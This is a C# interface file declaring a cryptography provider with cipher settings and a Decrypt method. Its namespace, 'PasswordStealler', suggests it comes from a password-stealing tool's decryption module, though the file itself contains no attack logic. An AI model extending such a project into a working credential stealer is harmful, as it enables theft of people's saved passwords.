using System.Security;
using PasswordStealler.Decryption;

namespace PasswordStealler.Factories
{
    public interface ICryptographyProvider
    {
        int BlockSizeInBytes { get; }

        BlockCipherEngines CipherEngine { get; }

        BlockCipherModes CipherMode { get; }

        int KeyDerivationIterations { get; set; }

        string Decrypt(string cipherText, SecureString decryptionKey);
    }
}